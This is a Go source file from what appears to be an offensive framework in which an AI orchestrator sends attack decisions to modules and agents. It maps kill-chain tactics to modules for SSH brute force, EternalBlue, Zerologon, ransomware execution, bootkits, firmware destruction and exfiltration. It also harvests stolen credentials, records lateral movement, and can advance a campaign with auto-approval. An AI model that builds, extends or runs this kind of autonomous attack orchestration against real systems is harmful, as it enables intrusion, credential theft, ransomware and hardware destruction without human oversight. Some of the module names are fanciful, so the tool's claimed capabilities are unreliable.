// Package dispatch maps decisions from the AI orchestrator to concrete modules and agents.
// It handles both async (DispatchDecision) and sync (DispatchDecisionSync) execution paths.
package dispatch

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"strings"
	"time"

	"github.com/ruby570bocadito/vesper/internal/registry"
	"github.com/ruby570bocadito/vesper/pkg/shared/types"
)

// Dispatcher routes decisions to appropriate modules and agents.
// It selects the best agent, maps tactics to modules, and executes or bridges them.
type Dispatcher struct {
	state         AppStateAccessor
	log           *log.Logger
	autoApprove   bool
	minConfidence float64
}

// AppStateAccessor is the interface the dispatcher needs from the application state.
type AppStateAccessor interface {
	GetAgents() []*types.Agent
	GetAgent(id string) *types.Agent
	AddHost(host *types.Target)
	AddVulnerability(v *types.Vulnerability)
	AddCredential(c *types.Credential)
	AddLateralEdge(from, to, exploit string)
	GetBridgeClient() BridgeCaller
}

// BridgeCaller abstracts the Python bridge RPC client.
type BridgeCaller interface {
	CallRaw(ctx context.Context, module, function string, params map[string]interface{}) (map[string]interface{}, error)
	IsConnected() bool
}

// AgentDispatcher abstracts agent command dispatch for lateral movement.
type AgentDispatcher interface {
	SendCommand(ctx context.Context, agentID string, module string, target string, params map[string]string) (string, error)
}

// DispatchResult holds the outcome of a synchronous module execution.
type DispatchResult struct {
	Success            bool
	NewHosts           []registry.Target
	NewVulnerabilities []*types.Vulnerability
	NewCredentials     []*types.Credential
	ExploitSucceeded   bool
	ExploitFrom        string
	ExploitTo          string
	ExploitName        string
	Output             string
}

func New(accessor AppStateAccessor, autoApprove bool, minConf float64) *Dispatcher {
	return &Dispatcher{
		state:         accessor,
		autoApprove:   autoApprove,
		minConfidence: minConf,
		log:           log.New(log.Writer(), "[DISPATCHER] ", log.LstdFlags),
	}
}

func (d *Dispatcher) DispatchDecision(ctx context.Context, campaign *types.Campaign, decision *types.Decision) error {
	d.log.Printf("Dispatching decision %s: %s/%s (conf=%.2f) for campaign %s",
		decision.ID, decision.Tactic, decision.Technique, decision.Confidence, campaign.ID)

	moduleName := d.mapTacticToModule(decision.Tactic, decision.Technique, campaign)
	if moduleName == "" {
		d.log.Printf("No module mapped for tactic %s, advancing phase only", decision.Tactic)
		d.advancePhase(campaign, decision)
		return nil
	}

	module, ok := registry.GetModule(moduleName)
	if !ok {
		d.log.Printf("Module %s not found in registry, trying bridge", moduleName)
		d.tryBridge(ctx, moduleName, decision, campaign)
		return nil
	}

	agent := d.selectBestAgent(campaign, decision)
	if agent == nil {
		d.log.Printf("No agent available for decision %s, queuing", decision.ID)
		return fmt.Errorf("no agent available")
	}

	target := registry.Target{
		Hostname: decision.Target,
		IP:       decision.Target,
		OS:       "unknown",
		Ports:    d.extractPorts(campaign),
	}

	go func() {
		execCtx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
		defer cancel()

		mod := module.Factory()
		result, err := mod.Execute(execCtx, target)

		if err != nil || !result.Success {
			d.log.Printf("Module %s failed: %v", moduleName, err)
			return
		}

		d.log.Printf("Module %s succeeded: %s", moduleName, result.Output)

		for _, host := range result.NewHosts {
			d.state.AddHost(&types.Target{
				Hostname: host.Hostname,
				IP:       host.IP,
				OS:       host.OS,
			})
		}

		for _, credStr := range result.NewCreds {
			cred := d.parseCredential(credStr, moduleName)
			if cred != nil {
				d.state.AddCredential(cred)
			}
		}

		vulns := d.extractVulnerabilities(result.Output, decision.Target)
		for _, v := range vulns {
			d.state.AddVulnerability(v)
		}

		if d.isLateralMovement(decision.Tactic) && result.Success {
			fromHost := d.inferSourceHost(campaign)
			toHost := decision.Target
			d.state.AddLateralEdge(fromHost, toHost, moduleName)
		}

		d.advancePhase(campaign, decision)
	}()

	d.log.Printf("Dispatched %s to agent %s", moduleName, agent.ID)
	return nil
}

func (d *Dispatcher) DispatchDecisionSync(ctx context.Context, campaign *types.Campaign, decision *types.Decision) (*DispatchResult, error) {
	d.log.Printf("Dispatching (sync) decision %s: %s/%s (conf=%.2f) for campaign %s",
		decision.ID, decision.Tactic, decision.Technique, decision.Confidence, campaign.ID)

	moduleName := d.mapTacticToModule(decision.Tactic, decision.Technique, campaign)
	if moduleName == "" {
		return &DispatchResult{Success: false}, fmt.Errorf("no module for tactic %s", decision.Tactic)
	}

	module, ok := registry.GetModule(moduleName)
	if !ok {
		return d.tryBridgeSync(ctx, moduleName, decision, campaign)
	}

	target := registry.Target{
		Hostname: decision.Target,
		IP:       decision.Target,
		OS:       "unknown",
		Ports:    d.extractPorts(campaign),
	}

	mod := module.Factory()
	result, err := mod.Execute(ctx, target)
	if err != nil || !result.Success {
		return &DispatchResult{Success: false}, err
	}

	dr := &DispatchResult{
		Success:  true,
		NewHosts: result.NewHosts,
		Output:   result.Output,
	}

	for _, host := range result.NewHosts {
		d.state.AddHost(&types.Target{
			Hostname: host.Hostname,
			IP:       host.IP,
			OS:       host.OS,
		})
	}

	for _, credStr := range result.NewCreds {
		cred := d.parseCredential(credStr, moduleName)
		if cred != nil {
			d.state.AddCredential(cred)
			dr.NewCredentials = append(dr.NewCredentials, cred)
		}
	}

	vulns := d.extractVulnerabilities(result.Output, decision.Target)
	for _, v := range vulns {
		d.state.AddVulnerability(v)
		dr.NewVulnerabilities = append(dr.NewVulnerabilities, v)
	}

	if d.isLateralMovement(decision.Tactic) && result.Success {
		fromHost := d.inferSourceHost(campaign)
		toHost := decision.Target
		d.state.AddLateralEdge(fromHost, toHost, moduleName)
		dr.ExploitSucceeded = true
		dr.ExploitFrom = fromHost
		dr.ExploitTo = toHost
		dr.ExploitName = moduleName
	}

	return dr, nil
}

func (d *Dispatcher) mapTacticToModule(tactic, technique string, campaign *types.Campaign) string {
	techLower := strings.ToLower(technique)

	// Intelligent selection based on technique
	if tactic == "Initial Access" || tactic == "Lateral Movement" {
		if strings.Contains(techLower, "ssh") {
			return "exploit/ssh_bruteforce"
		}
		if strings.Contains(techLower, "smb") || strings.Contains(techLower, "eternalblue") || strings.Contains(techLower, "ms17-010") {
			return "exploit/eternalblue"
		}
	}
	if tactic == "Privilege Escalation" {
		if strings.Contains(techLower, "suid") {
			return "exploit/privesc_suid"
		}
		if strings.Contains(techLower, "zerologon") {
			return "exploit/zerologon"
		}
	}
	if tactic == "Persistence" {
		if strings.Contains(techLower, "cron") {
			return "post/persist_cron"
		}
	}
	if tactic == "Reconnaissance" {
		return "recon"
	}
	if tactic == "Actions on Objective" {
		if strings.Contains(techLower, "ransomware") || strings.Contains(techLower, "encrypt") {
			return "ransomware/execute"
		}
	}

	mappings := map[string][]string{
		"Reconnaissance": {
			"recon", "auxiliary/recon_osint", "v27/phishing_infra",
			"v28/iot_identity_theft", "v26/cloud_nemesis",
			"hydra/dns_rebinding", "rf_contagion/baseband",
		},
		"Initial Access": {
			"exploit/ssh_bruteforce", "exploit/eternalblue", "v27/spear_phish_ai",
			"v27/smishing_sms", "v28/fake_vulns", "v27/phishing_infra",
			"hydra/cicd_webhooks", "hydra/usb_adb", "hydra/qr_worm",
			"ai/deepfake_vishing", "hydra/powerline",
		},
		"Privilege Escalation": {
			"exploit/privesc_suid", "exploit/zerologon", "v28/patchguard_bypass",
			"v27/kernel_instrument", "v29/microcode_corrupt",
			"evasion/byovd_loader", "evasion/dkom",
		},
		"Persistence": {
			"post/persist_cron", "v26/bootkit_smm", "v27/uefi_bootkit",
			"v27/hypervisor_ring1", "v29/nic_persist", "v29/intel_me_flash",
			"evasion/wer_persistence", "evasion/blue_pill", "evasion/mft_slack",
		},
		"Command and Control": {
			"v26/social_c2", "v26/cloud_nemesis", "v210/phantom_evasion",
			"v28/cdn_injection", "v28/keyboard_led",
			"c2/multi_channel", "c2/spiffe_mtls", "c2/ed25519",
			"c2/kyber_hybrid", "c2/proto_obfuscate", "c2/dashboard_ops",
		},
		"Lateral Movement": {
			"exploit/eternalblue", "ransomware/worm", "v29/network_ghosts",
			"v28/isp_bgp", "blockz/firmware_worm",
			"hydra/ultrasound", "hydra/vlan_jump", "hydra/pjl_worm",
			"propagation/kerberos_del", "propagation/imdsv2_bypass",
		},
		"Collection": {
			"ransomware/scan", "ransomware/identity_destroy",
			"v28/iot_identity_theft", "v28/emotion_encrypt",
			"ai/federated_learn",
		},
		"Exfiltration": {
			"blockz/airgap_exfil", "v28/keyboard_led",
			"v29/acoustic_resonance", "blockz/airgap_exfil",
			"hydra/dns_rebinding",
		},
		"Actions on Objective": {
			"ransomware/execute", "v210/apocalipsis", "v29/hdd_firmware_destroy",
			"v29/vrm_overvoltage", "v29/usb_killer", "v29/digital_thermite",
			"evasion/anti_forensics_adv", "propagation/chronos_ntp",
		},
		"Defense Evasion": {
			"evasion/byovd_loader", "evasion/dkom", "evasion/anti_reversing",
			"evasion/anti_forensics_adv", "evasion/wfp_dns_poison",
			"evasion/lolbin_chainer", "evasion/wfp_kernel_dns",
			"ai/jit_polymorphism", "loader/cross_platform",
			"propagation/reflective_dll", "bridge/wazero",
		},
	}

	opts, ok := mappings[tactic]
	if !ok || len(opts) == 0 {
		phaseMods := registry.GetModulesForPhase(campaign.Phase)
		if len(phaseMods) > 0 {
			return phaseMods[rand.Intn(len(phaseMods))].Name
		}
		return ""
	}

	return opts[rand.Intn(len(opts))]
}

func mapModuleToBridgeFunction(moduleName string) string {
	mapping := map[string]string{
		"exploit/ssh_bruteforce":   "scan",
		"post/persist_cron":        "execute",
		"ransomware/scan":          "scan",
		"ransomware/propagate":     "propagate",
		"ransomware/encrypt":       "encrypt",
		"ransomware/execute":       "execute",
		"v26/pomdp_decide":         "pomdp_decide",
		"v27/uefi_bootkit":         "uefi_bootkit",
		"v29/hdd_firmware_destroy": "hdd_firmware_destroy",
		"v210/apocalipsis":         "apocalipsis",
	}

	if fn, ok := mapping[moduleName]; ok {
		return fn
	}
	return "execute"
}

func (d *Dispatcher) selectBestAgent(campaign *types.Campaign, decision *types.Decision) *types.Agent {
	agents := d.state.GetAgents()
	if len(agents) == 0 {
		return nil
	}

	var best *types.Agent
	bestScore := -1.0
	targetSubnet := ""
	if idx := strings.LastIndex(decision.Target, "."); idx != -1 {
		targetSubnet = decision.Target[:idx+1]
	}

	for _, a := range agents {
		score := 0.5
		if strings.EqualFold(a.OS, "linux") || strings.EqualFold(a.OS, "windows") {
			score = 0.8
		}
		if a.ID != "" {
			score += 0.2
		}
		// Prefer agents on the same subnet as the target
		if targetSubnet != "" && strings.HasPrefix(a.LocalIP, targetSubnet) {
			score += 2.0
		}
		// Prioritize agents with active status
		if a.Status == "active" || a.Status == "online" {
			score += 1.0
		}

		if score > bestScore {
			bestScore = score
			best = a
		}
	}
	return best
}

func (d *Dispatcher) tryBridge(ctx context.Context, moduleName string, decision *types.Decision, campaign *types.Campaign) {
	bridge := d.state.GetBridgeClient()
	if bridge == nil || !bridge.IsConnected() {
		d.log.Printf("Bridge not connected, skipping %s", moduleName)
		return
	}

	params := map[string]interface{}{
		"target": decision.Target,
		"phase":  string(campaign.Phase),
	}

	fnName := mapModuleToBridgeFunction(moduleName)
	result, err := bridge.CallRaw(ctx, moduleName, fnName, params)
	if err != nil {
		d.log.Printf("Bridge call failed for %s: %v", moduleName, err)
		return
	}

	d.log.Printf("Bridge %s result: %v", moduleName, result)
	d.processBridgeResult(result, decision, campaign, moduleName)
	d.advancePhase(campaign, decision)
}

func (d *Dispatcher) tryBridgeSync(ctx context.Context, moduleName string, decision *types.Decision, campaign *types.Campaign) (*DispatchResult, error) {
	bridge := d.state.GetBridgeClient()
	if bridge == nil || !bridge.IsConnected() {
		return &DispatchResult{Success: false}, fmt.Errorf("bridge not connected")
	}

	params := map[string]interface{}{
		"target": decision.Target,
		"phase":  string(campaign.Phase),
	}

	fnName := mapModuleToBridgeFunction(moduleName)
	result, err := bridge.CallRaw(ctx, moduleName, fnName, params)
	if err != nil {
		return &DispatchResult{Success: false}, err
	}

	dr := &DispatchResult{Success: true, Output: fmt.Sprintf("%v", result)}
	d.processBridgeResultInto(result, decision, campaign, moduleName, dr)
	return dr, nil
}

func (d *Dispatcher) processBridgeResult(result map[string]interface{}, decision *types.Decision, campaign *types.Campaign, moduleName string) {
	d.processBridgeResultInto(result, decision, campaign, moduleName, &DispatchResult{})
}

func (d *Dispatcher) processBridgeResultInto(result map[string]interface{}, decision *types.Decision, campaign *types.Campaign, moduleName string, dr *DispatchResult) {
	if hosts, ok := result["new_hosts"]; ok {
		if hostList, ok := hosts.([]interface{}); ok {
			for _, h := range hostList {
				if hm, ok := h.(map[string]interface{}); ok {
					t := &types.Target{
						IP:       stringFromMap(hm, "ip"),
						Hostname: stringFromMap(hm, "hostname"),
						OS:       stringFromMap(hm, "os"),
					}
					d.state.AddHost(t)
				}
			}
		}
	}

	if vulns, ok := result["new_vulnerabilities"]; ok {
		if vulnList, ok := vulns.([]interface{}); ok {
			for _, v := range vulnList {
				if vm, ok := v.(map[string]interface{}); ok {
					vuln := &types.Vulnerability{
						CVE:         stringFromMap(vm, "cve"),
						Description: stringFromMap(vm, "description"),
						Severity:    stringFromMap(vm, "severity"),
						Service:     stringFromMap(vm, "service"),
						TargetIP:    decision.Target,
					}
					d.state.AddVulnerability(vuln)
					dr.NewVulnerabilities = append(dr.NewVulnerabilities, vuln)
				}
			}
		}
	}

	if creds, ok := result["new_credentials"]; ok {
		if credList, ok := creds.([]interface{}); ok {
			for _, c := range credList {
				if cm, ok := c.(map[string]interface{}); ok {
					cred := &types.Credential{
						Username: stringFromMap(cm, "username"),
						Password: stringFromMap(cm, "password"),
						Hash:     stringFromMap(cm, "hash"),
						Domain:   stringFromMap(cm, "domain"),
						Source:   moduleName,
					}
					d.state.AddCredential(cred)
					dr.NewCredentials = append(dr.NewCredentials, cred)
				}
			}
		}
	}

	if exploitOk, ok := result["exploit_succeeded"]; ok {
		if succeeded, ok := exploitOk.(bool); ok && succeeded {
			fromHost := d.inferSourceHost(campaign)
			toHost := decision.Target
			d.state.AddLateralEdge(fromHost, toHost, moduleName)
			dr.ExploitSucceeded = true
			dr.ExploitFrom = fromHost
			dr.ExploitTo = toHost
			dr.ExploitName = moduleName
		}
	}
}

func (d *Dispatcher) advancePhase(campaign *types.Campaign, decision *types.Decision) {
	phaseMap := map[string]types.KillChainPhase{
		"Reconnaissance":       types.PhaseWeaponization,
		"Weaponization":        types.PhaseDelivery,
		"Initial Access":       types.PhaseExploitation,
		"Privilege Escalation": types.PhaseInstallation,
		"Persistence":          types.PhaseCommandAndControl,
		"Command and Control":  types.PhaseActionsOnObjective,
		"Lateral Movement":     types.PhaseActionsOnObjective,
		"Collection":           types.PhaseExfiltration,
		"Exfiltration":         types.PhaseExfiltration,
		"Actions on Objective": types.PhaseExfiltration,
	}

	if nextPhase, ok := phaseMap[decision.Tactic]; ok {
		campaign.Phase = nextPhase
		campaign.Progress = float64(nextPhase.Order()) / 8.0
	}
}

func (d *Dispatcher) extractPorts(campaign *types.Campaign) []int {
	_ = campaign
	return []int{22, 80, 443, 445, 3389}
}

func (d *Dispatcher) parseCredential(credStr string, source string) *types.Credential {
	parts := strings.SplitN(credStr, ":", 2)
	if len(parts) == 2 {
		return &types.Credential{
			Username: parts[0],
			Password: parts[1],
			Source:   source,
		}
	}
	if strings.Contains(credStr, "$") || len(credStr) > 30 {
		return &types.Credential{
			Hash:   credStr,
			Source: source,
		}
	}
	return &types.Credential{
		Username: credStr,
		Source:   source,
	}
}

func (d *Dispatcher) extractVulnerabilities(output string, targetIP string) []*types.Vulnerability {
	var vulns []*types.Vulnerability
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		if strings.Contains(line, "CVE-") {
			idx := strings.Index(line, "CVE-")
			end := idx + 4
			for end < len(line) && (line[end] >= '0' && line[end] <= '9' || line[end] == '-') {
				end++
			}
			cve := line[idx:end]
			vulns = append(vulns, &types.Vulnerability{
				CVE:      cve,
				TargetIP: targetIP,
				Severity: "medium",
			})
		}
	}
	return vulns
}

func (d *Dispatcher) isLateralMovement(tactic string) bool {
	return tactic == "Lateral Movement" || tactic == "Initial Access"
}

func (d *Dispatcher) inferSourceHost(campaign *types.Campaign) string {
	agents := d.state.GetAgents()
	if len(agents) > 0 {
		return agents[0].LocalIP
	}
	return "0.0.0.0"
}

func stringFromMap(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}
